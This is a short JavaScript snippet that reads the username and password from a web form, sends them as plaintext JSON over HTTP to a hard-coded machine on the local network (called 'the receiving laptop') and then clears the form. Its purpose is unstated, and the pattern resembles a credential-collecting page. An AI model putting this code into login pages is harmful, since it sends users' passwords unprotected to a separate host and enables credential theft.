
function checkConnection() {
// Send a GET request to check connection
fetch('http://192.168.151.25:8000', {  // Replace with actual IP of the server
method: 'GET',
})
.then(response => {
if (response.ok) {
console.log("Connection established.");
} else {
console.log("Server responded but with a non-200 status:", response.status);
}
})
.catch(error => console.error('Connection error:', error));
}

function sendData(event) {
event.preventDefault();

const username = document.getElementById('username').value;
const password = document.getElementById('password').value;

// Send data to the local server
fetch('http://192.168.151.25:8000', {  // Replace <RECEIVER_IP> with the actual IP of the receiving laptop
method: 'POST',
headers: {
'Content-Type': 'application/json'
},
body: JSON.stringify({ username, password })
})
.then(response => response.text())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));

// Reset form
event.target.reset();
}
